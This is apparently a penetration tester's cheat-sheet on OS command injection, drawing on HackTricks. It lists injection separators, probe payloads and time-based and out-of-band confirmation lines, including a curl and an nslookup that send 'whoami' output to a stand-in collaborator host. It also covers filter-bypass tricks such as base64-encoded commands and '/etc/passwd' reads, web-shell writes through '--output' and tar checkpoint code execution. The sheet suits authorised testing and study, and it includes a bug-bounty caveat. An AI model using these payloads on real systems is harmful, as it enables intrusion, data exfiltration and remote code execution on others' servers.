# Moraa — OS command injection

> HackTricks `command-injection`. Cross-ref [[rce-scenarios]] (decision tree into this),
> [[file-upload]] (filename→shell), [[ssrf]] (a "ping"/"trace" feature is a classic sink).

## Find the sink
Any feature that shells out: ping/traceroute/DNS-lookup tools, image/video conversion (ImageMagick/
ffmpeg wrappers), PDF generation, "export to..." / archive creation, git/webhook integrations, DNS/
network diagnostics, filename passed to a CLI tool, IP/host params on admin diagnostic pages.

## Injection separators (try all — WAFs/filters often only block some)
```
;   |   ||   &   &&   `cmd`   $(cmd)   \n (newline in a param that's later put on its own shell line)
```
Baseline probe: `127.0.0.1;id` / `127.0.0.1 && id` / `` 127.0.0.1`id` `` / `127.0.0.1$(id)` — a
response-time or output difference confirms execution (`;sleep 5;` is the blind-safe version — see below).

## Blind / no-output confirmation (default assumption — most sinks don't echo)
```bash
# time-based
127.0.0.1;sleep 9
127.0.0.1$(sleep 9)
# OOB — works even when the app has no visible output AND no timing channel (e.g. async job)
127.0.0.1;curl http://COLLABORATOR/$(whoami)
127.0.0.1;nslookup $(whoami).COLLABORATOR
```

## Filter/WAF bypass toolkit
```
# space bypass
cmd${IFS}arg          cmd<arg          {cmd,arg}          $IFS$9
# blocked chars bypass
c${a}t /etc/passwd     # brace expansion breaks a blocklisted "cat"
w'h'o'am'i             wh""oami         w\ho\am\i
# blocked keyword bypass (case/concat)
CaT /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)     # base64-encode the whole command
# numeric obfuscation of a blocked digit/IP octet in the target arg
127.0.0.1 → 0x7f.0.0.1  → 017700000001 (octal) → 2130706433 (decimal)
```

## Argument injection (no separator needed — the app builds `tool --flag <your-input>`)
If input goes in as an ARGUMENT to a fixed binary (no shell metachar needed), inject flags instead:
```
--output=/var/www/html/shell.php     (wc, tar, zip, etc. sometimes support arbitrary --output/-o)
tar --checkpoint=1 --checkpoint-action=exec=sh\ shell.sh    # classic tar arg-injection RCE
```

## Windows variants
```
&    &&    |    ||    %COMSPEC%    powershell -enc <base64>
;    is NOT a separator in cmd.exe — use & or &&
```

## Confirm & escalate
1. Blind confirm via time/OOB (safest, always try first). 2. If output IS reflected, `id`/`whoami`
first, then a reverse shell ([[../payloads/reverse-shells]] — CPTS-track only; in bug bounty, STOP at
`id`/`whoami`/`cat /etc/passwd`-class proof, never establish persistence or pivot without explicit
authorization for that). State the exact sink and the unsanitized parameter.
